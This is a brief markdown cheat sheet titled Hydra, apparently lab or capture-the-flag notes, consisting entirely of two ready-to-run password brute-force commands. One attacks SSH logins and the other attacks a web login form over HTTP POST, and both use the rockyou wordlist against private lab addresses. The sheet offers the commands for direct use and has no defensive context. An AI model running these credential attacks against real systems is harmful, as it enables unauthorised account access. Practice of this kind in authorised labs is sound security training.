# Hydra

SSH PW Brute Force user "user"

``` sh
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.112.131
```

Web Form Brute Force:

``` sh
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.233.243 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 
```
